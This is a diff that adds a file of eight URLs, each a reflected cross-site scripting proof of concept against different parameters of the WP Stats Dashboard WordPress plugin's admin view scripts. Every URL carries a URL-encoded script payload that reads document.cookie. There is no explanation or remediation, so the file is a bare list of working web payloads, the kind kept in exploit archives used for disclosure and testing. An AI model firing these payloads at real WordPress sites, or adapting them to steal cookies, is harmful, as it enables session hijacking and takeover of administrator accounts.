@@ -1,0 +1,15 @@
+http://www.example.com/wp-content/plugins/wp-stats-dashboard/view/admin/admin_profile_type.php?icon=%22%3E%3Cscript%3Ealert%28document.cookie%29;%3C/script%3E
+
+http://www.example.com/wp-content/plugins/wp-stats-dashboard/view/admin/admin_profile_type.php?url=%22%3E%3Cscript%3Ealert%28document.cookie%29;%3C/script%3E
+
+http://www.example.com/wp-content/plugins/wp-stats-dashboard/view/admin/admin_profile_type.php?name=%22%3E%3Cscript%3Ealert%28document.cookie%29;%3C/script%3E
+
+http://www.example.com/wp-content/plugins/wp-stats-dashboard/view/admin/admin_profile_type.php?type=%22%3E%3Cscript%3Ealert%28document.cookie%29;%3C/script%3E
+
+http://www.example.com/wp-content/plugins/wp-stats-dashboard/view/admin/admin_profile_type.php?code=%22%3E%3Cscript%3Ealert%28document.cookie%29;%3C/script%3E
+
+http://www.example.com/wp-content/plugins/wp-stats-dashboard/view/admin/admin_profile_type.php?code=200&username=%22%3E%3Cscript%3Ealert%28document.cookie%29;%3C/script%3E
+
+http://www.example.com/wp-content/plugins/wp-stats-dashboard/view/admin/blocks/select-trend.php?onchange=%3E%3Cscript%3Ealert%28document.cookie%29;%3C/script%3E
+
+http://www.example.com/wp-content/plugins/wp-stats-dashboard/view/admin/blocks/submenu.php?submenu[%22%3E%3Cscript%3Ealert%28document.cookie%29;%3C/script%3E]
